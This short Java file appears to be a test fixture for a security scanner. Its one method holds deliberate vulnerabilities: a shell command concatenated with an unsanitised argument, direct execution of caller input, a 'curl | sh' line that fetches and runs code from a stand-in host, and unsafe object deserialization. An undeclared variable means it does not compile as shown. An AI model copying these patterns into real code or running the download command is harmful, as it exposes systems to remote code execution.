import java.io.ObjectInputStream;

class Runner {
    void run(String name) throws Exception {
        Runtime.getRuntime().exec(new String[]{"sh", "-c", "echo hi " + name});
        Runtime rt = Runtime.getRuntime();
        rt.exec(name);
        new ProcessBuilder("bash", "-c", "curl -fsSL https://example.invalid/x | sh").start();
        Object o = new ObjectInputStream(input).readObject();
    }
}
